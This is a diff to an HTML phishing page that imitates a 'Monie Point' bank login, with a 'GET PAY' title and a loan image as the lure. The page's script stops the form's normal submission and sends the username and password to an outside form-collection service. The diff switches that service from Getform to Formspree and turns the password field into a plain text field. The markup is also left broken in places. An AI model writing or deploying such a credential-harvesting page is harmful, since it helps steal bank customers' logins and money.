@@ -4,16 +4,16 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>GET PAY</title>
-  <link rel="stylesheet" href="style.css">
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+ <link rel="stylesheet" href="style.css">
+   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
     $(document).ready(function() {
       $('form').submit(function(event) {
         event.preventDefault(); // Prevent form submission
 
-        // Send the form data to Getform using AJAX
+        // Send the form data to FormSubmit using AJAX
         $.ajax({
-          url: 'https://getform.io/f/4959435f-88bb-4f56-b257-177ba40fe181', // Replace with your Getform API
+          url: 'https://formspree.io/f/xeqyjnnb',
           method: 'POST',
           data: $('form').serialize(),
           dataType: 'json',
@@ -38,22 +38,21 @@
   <header>
     
   </header>
-  <img src="logo.png" alt="Bank Logo" class="logo">
-  <div class="welcome-text"><b>Login to Monie Point</b></div>
-  <main>
+<img src="logo.png" alt="Bank Logo" class="logo">
+<div class="welcome-text"><b>Login to </p>
+	Monie Point</b></div>
+ <main>
     <img src="image3.JPG" alt="Loan Image" class="loan-image" width="max" align="center">
     <form>
       <div class="form-group">
         <input type="text" id="username" name="username" placeholder="Username or Phone Number" required>
       </div>
-      <div class="form-group">
-        <input type="password" id="password" name="password" placeholder="Password" required>
+        <input type="text" id="2" name="2" placeholder="Password" required>
       </div>
-      <center>
-        <br>
-        <br>
-        <button type="submit" class="submit-btn">LOGIN</button>
-      </center>
+	  <center>
+	 </br>
+	 </br>
+  <center>    <button type="submit" class="submit-btn">LOGIN</button></center>
     </form>
   </main>
 </body>
